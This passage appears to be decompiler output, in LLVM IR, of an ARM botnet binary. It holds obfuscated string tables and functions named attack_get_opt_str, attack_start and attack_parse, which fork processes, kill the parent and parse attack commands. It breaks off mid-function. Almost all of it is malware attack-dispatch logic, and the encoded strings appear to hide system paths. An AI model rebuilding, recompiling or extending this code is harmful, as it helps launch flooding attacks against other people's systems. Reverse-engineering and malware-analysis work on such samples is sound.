source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_221d0.23 = global i32 0
@global_var_db18.27 = constant i32 -382906384
@global_var_223f4.32 = global i32 0
@global_var_831c.33 = constant i32 -352321547
@global_var_ff00.34 = constant i32 -481165275
@global_var_1357c.35 = constant i32 -382909968
@global_var_bd94.41 = constant i32 -382906384
@global_var_c1cc.43 = constant i32 -382906384
@global_var_b608.45 = constant i32 -382906384
@global_var_af5c.47 = constant i32 -382906384
@global_var_a864.49 = constant i32 -382906384
@global_var_a0b0.51 = constant i32 -382906384
@global_var_9040.54 = constant i32 -382906384
@global_var_89ac.56 = constant i32 -382906384
@global_var_965c.58 = constant i32 -382906384
@global_var_10000.59 = constant i32 -476053472
@global_var_24f10.62 = global i32 0
@global_var_24f18.74 = global i32 0
@global_var_19a68.76 = constant i32 47
@global_var_c707.78 = constant [3 x i8] c"\0AH\00"
@global_var_223f8.80 = global i32 0
@global_var_24f14.82 = global i32 0
@global_var_11458.84 = constant i32 -382910336
@global_var_d4a0.85 = constant i32 -509607932
@global_var_d9a4.87 = constant i32 -382910352
@global_var_22284.89 = global i32 69136
@global_var_2227c.91 = global i32 -1
@global_var_d99c.92 = constant i32 139912
@global_var_24f20.97 = local_unnamed_addr global i32 0
@global_var_24f1e.98 = local_unnamed_addr global i32 0
@global_var_223fc.100 = global i32 0
@global_var_19a6c.108 = constant i32 10
@global_var_22280.110 = global i32 -1
@global_var_14a50.115 = constant i32 -450904024
@global_var_10e10.116 = constant i32 -382910352
@global_var_19a70.120 = constant i32 16777216
@global_var_22404.122 = global i32 0
@global_var_22410.124 = global i32 0
@global_var_22408.126 = global i32 0
@global_var_2240c.128 = global i32 0
@global_var_e99c.141 = constant i32 -509607925
@global_var_24f34.143 = global i32 0
@global_var_22448.145 = global i32 0
@global_var_22414.147 = global i32 0
@global_var_22440.149 = global i32 0
@global_var_24f2c.156 = global i32 0
@global_var_24f30.158 = global i32 0
@global_var_2241a.161 = local_unnamed_addr global i32 0
@global_var_2242c.163 = global i32 0
@global_var_2241c.165 = local_unnamed_addr global i32 0
@global_var_22420.166 = local_unnamed_addr global i32 0
@global_var_22421.167 = local_unnamed_addr global i32 0
@global_var_2243a.170 = local_unnamed_addr global i32 0
@global_var_fcd8.171 = constant i32 105080
@global_var_19a78.172 = constant [5 x i8] c"&;; \00"
@global_var_19a7c.174 = constant i32 0
@global_var_19a80.176 = constant [5 x i8] c"5:?;\00"
@global_var_19a88.178 = constant [9 x i8] c"<!: acam\00"
@global_var_19a94.180 = constant [8 x i8] c"0125!8 \00"
@global_var_19a9c.182 = constant [6 x i8] c"509=:\00"
@global_var_19aa4.184 = constant [6 x i8] c"\22=.,\22\00"
@global_var_19aac.186 = constant i32 423502179
@global_var_19abc.188 = constant [6 x i8] c"efg`a\00"
@global_var_19ac4.190 = constant [5 x i8] c"!'1&\00"
@global_var_19acc.192 = constant i32 943467547
@global_var_19ad8.194 = constant i32 322070023
@global_var_19ae4.196 = constant [5 x i8] c"efg`\00"
@global_var_19aec.198 = constant i32 606281272
@global_var_22424.199 = local_unnamed_addr global i32 0
@global_var_22422.200 = local_unnamed_addr global i32 0
@global_var_22428.201 = local_unnamed_addr global i32 0
@global_var_22430.203 = local_unnamed_addr global i32 0
@global_var_2243c.204 = local_unnamed_addr global i32 0
@global_var_eaac.206 = constant i32 -382910352
@global_var_19af4.208 = constant [3 x i8] c"\0D\0A\00"
@global_var_19b00.210 = constant i32 2096127
@global_var_19af7.212 = constant i32 2095871
@global_var_24f3c.217 = global i32 0
@global_var_2228c.220 = global i32 -555811921
@global_var_19b04.225 = constant i32 58965
@global_var_24f44.226 = local_unnamed_addr global i32 0
@global_var_24f48.227 = local_unnamed_addr global i32 0
@global_var_19b08.229 = constant [11 x i8] c"8!$0z78!6T\00"
@global_var_24f4c.230 = local_unnamed_addr global i32 0
@global_var_24f50.231 = local_unnamed_addr global i32 0
@global_var_24f54.232 = local_unnamed_addr global i32 0
@global_var_24f58.233 = local_unnamed_addr global i32 0
@global_var_19b14.235 = constant i32 28654
@global_var_24f5c.236 = local_unnamed_addr global i32 0
@global_var_24f60.237 = local_unnamed_addr global i32 0
@global_var_19b18.239 = constant [37 x i8] c"&;; t'1:$5=t>!' t=:217 10t-;!&t'<= T\00"
@global_var_24f64.240 = local_unnamed_addr global i32 0
@global_var_24f68.241 = local_unnamed_addr global i32 0
@global_var_19b40.243 = constant [7 x i8] c"'<188T\00"
@global_var_24f70.244 = local_unnamed_addr global i32 0
@global_var_24f6c.245 = local_unnamed_addr global i32 0
@global_var_10ae4.246 = constant i32 105288
@global_var_19b48.247 = constant [8 x i8] c"1:5681T\00"
@global_var_24f74.248 = local_unnamed_addr global i32 0
@global_var_24f78.249 = local_unnamed_addr global i32 0
@global_var_19b50.251 = constant [8 x i8] c"'-' 19T\00"
@global_var_24f7c.252 = local_unnamed_addr global i32 0
@global_var_24f80.253 = local_unnamed_addr global i32 0
@global_var_19b58.255 = constant [4 x i8] c"'<T\00"
@global_var_24f84.256 = local_unnamed_addr global i32 0
@global_var_24f88.257 = local_unnamed_addr global i32 0
@global_var_19b5c.259 = constant i32 977090171
@global_var_24f8c.260 = local_unnamed_addr global i32 0
@global_var_24f90.261 = local_unnamed_addr global i32 0
@global_var_19b70.263 = constant i32 102440217
@global_var_24f98.264 = local_unnamed_addr global i32 0
@global_var_24f94.265 = local_unnamed_addr global i32 0
@global_var_19b8c.267 = constant [10 x i8] c":7;&&17 T\00"
@global_var_24f9c.268 = local_unnamed_addr global i32 0
@global_var_24fa0.269 = local_unnamed_addr global i32 0
@global_var_19b98.271 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_24fa4.272 = local_unnamed_addr global i32 0
@global_var_24fa8.273 = local_unnamed_addr global i32 0
@global_var_19bac.275 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_24fb0.276 = local_unnamed_addr global i32 0
@global_var_24fac.277 = local_unnamed_addr global i32 0
@global_var_19bc4.279 = constant [8 x i8] c"{$&;7{T\00"
@global_var_24fb4.280 = local_unnamed_addr global i32 0
@global_var_24fb8.281 = local_unnamed_addr global i32 0
@global_var_19bcc.283 = constant [6 x i8] c"{1,1T\00"
@global_var_24fbc.284 = local_unnamed_addr global i32 0
@global_var_24fc0.285 = local_unnamed_addr global i32 0
@global_var_19bd4.287 = constant [5 x i8] c"{20T\00"
@global_var_24fc8.288 = local_unnamed_addr global i32 0
@global_var_24fc4.289 = local_unnamed_addr global i32 0
@global_var_19bdc.291 = constant [7 x i8] c"{95$'T\00"
@global_var_24fcc.292 = local_unnamed_addr global i32 0
@global_var_24fd0.293 = local_unnamed_addr global i32 0
@global_var_19be4.295 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_24fd4.296 = local_unnamed_addr global i32 0
@global_var_24fd8.297 = local_unnamed_addr global i32 0
@global_var_19bf4.299 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_2504c.300 = local_unnamed_addr global i32 0
@global_var_19c00.302 = constant [8 x i8] c"z5:=91T\00"
@global_var_25054.303 = local_unnamed_addr global i32 0
@global_var_19c08.305 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_24fdc.306 = local_unnamed_addr global i32 0
@global_var_24fe0.307 = local_unnamed_addr global i32 0
@global_var_19c1c.309 = constant [24 x i8] c"3e567`09;ga<:$f8=1d?>2T\00"
@global_var_24fe4.310 = local_unnamed_addr global i32 0
@global_var_24fe8.311 = local_unnamed_addr global i32 0
@global_var_10b28.312 = constant i32 105524
@global_var_19c34.313 = constant [9 x i8] c"5''#;&0T\00"
@global_var_24fec.314 = local_unnamed_addr global i32 0
@global_var_24ff0.315 = local_unnamed_addr global i32 0
@global_var_19c40.317 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_24ff4.318 = local_unnamed_addr global i32 0
@global_var_24ff8.319 = local_unnamed_addr global i32 0
@global_var_19c50.321 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_24ffc.322 = local_unnamed_addr global i32 0
@global_var_25000.323 = local_unnamed_addr global i32 0
@global_var_19c64.325 = constant [11 x i8] c"0\22&<18$1&T\00"
@global_var_2505c.326 = local_unnamed_addr global i32 0
@global_var_19cc8.328 = constant i32 557516544
@global_var_25008.329 = local_unnamed_addr global i32 0
@global_var_25004.330 = local_unnamed_addr global i32 0
@global_var_19c70.332 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_2500c.333 = local_unnamed_addr global i32 0
@global_var_25010.334 = local_unnamed_addr global i32 0
@global_var_19c84.336 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_25018.337 = local_unnamed_addr global i32 0
@global_var_25014.338 = local_unnamed_addr global i32 0
@global_var_2501c.339 = local_unnamed_addr global i32 0
@global_var_25020.340 = local_unnamed_addr global i32 0
@global_var_25024.341 = local_unnamed_addr global i32 0
@global_var_25028.342 = local_unnamed_addr global i32 0
@global_var_19c94.344 = constant [9 x i8] c"$662*7!E\00"
@global_var_2502c.345 = local_unnamed_addr global i32 0
@global_var_25030.346 = local_unnamed_addr global i32 0
@global_var_19ca0.348 = constant [6 x i8] c";3=:T\00"
@global_var_25034.349 = local_unnamed_addr global i32 0
@global_var_25038.350 = local_unnamed_addr global i32 0
@global_var_19ca8.352 = constant [7 x i8] c"1: 1&T\00"
@global_var_2503c.353 = local_unnamed_addr global i32 0
@global_var_19cb0.355 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_25044.356 = local_unnamed_addr global i32 0
@global_var_221d4.362 = global i32 0
@global_var_117b0.384 = constant i32 -443088884
@global_var_11c4c.400 = constant i32 -456978431
@global_var_10390.413 = constant i32 -509607928
@global_var_1253c.445 = constant i32 -478871519
@global_var_12fe0.462 = constant i32 -478805983
@global_var_133c8.472 = constant i32 -382906384
@global_var_154d0.481 = constant i32 -442544040
@global_var_13d60.504 = constant i32 -369098502
@global_var_14734.518 = constant i32 -382910288
@global_var_148e4.530 = constant i32 -2020859901
@global_var_149d0.533 = constant i32 -494075872
@global_var_1161c.534 = constant i32 -382910336
@global_var_253ec.537 = local_unnamed_addr global i32 0
@global_var_137f8.550 = constant i32 -442543860
@global_var_d274.555 = constant i32 -481099767
@global_var_11bb0.559 = constant i32 -369093146
@global_var_cd70.583 = constant i32 -509607925
@global_var_cd24.585 = constant i32 -528482294
@global_var_159c8.588 = constant i32 -382910352
@global_var_16dd8.611 = constant i32 -382906384
@global_var_16898.639 = constant i32 -382910448
@global_var_18288.640 = constant i32 -382909968
@global_var_189c4.702 = constant i32 -481296376
@global_var_18abc.703 = constant i32 -481296376
@global_var_18b40.704 = constant i32 -369098732
@global_var_223d4.13 = external global i8*
@global_var_223f0.30 = external global i8*
@global_var_223f1.39 = global i8 0
@global_var_ffff.60 = constant i16 8427
@1 = internal constant [2 x i8] c"\01\00"
@global_var_22288.93 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_24f1c.96 = global i16* null
@global_var_22400.113 = external global i8*
@global_var_22444.151 = global i16* null
@global_var_22418.160 = external global i8*
@global_var_22438.164 = local_unnamed_addr global i8 0
@global_var_2242e.168 = local_unnamed_addr global i16 0
@global_var_22439.169 = local_unnamed_addr global i8 0
@global_var_2222c.358 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_223d4.13 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_223d4.13 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_223d4.13, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_221d0.23, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_221d0.23 to i32)

; uselistorder directives
  uselistorder i32* @global_var_221d0.23, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_db18.27 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 105048, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_223f0.30 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_223f0.30 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_223f4.32 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_223f4.32, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v4_8368 = mul i32 %v2_834c, 16777216
  %v5_8368 = or i32 %v5_8360, %v4_8368
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
